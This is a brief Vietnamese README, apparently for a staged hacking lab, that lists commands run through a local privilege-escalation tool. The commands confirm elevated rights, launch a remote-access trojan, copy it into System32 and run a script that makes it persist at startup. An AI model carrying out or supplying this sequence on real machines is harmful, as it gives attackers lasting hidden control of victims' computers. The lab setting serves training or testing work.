# lpe_all_files



clone máy của level 3 thành 1 máy level 4 riêng <br>

Thứ tự chạy các events: 
- Chạy exploit.exe -c whoami  // # check quyền khai thác có thành công
- Chạy exploit.exe -c "./explorerRat.exe"  // # chạy backdoor remote access
- Chạy exploit.exe -c "cp explorerRat.exe C:\Windows\System32" // # copy backdoor vào system32 để lưu trữ
- Chạy exploit.exe -c "./regRat.ps1"  // # thực hiện lệnh persistence cho RAT khởi động mỗi khi máy start
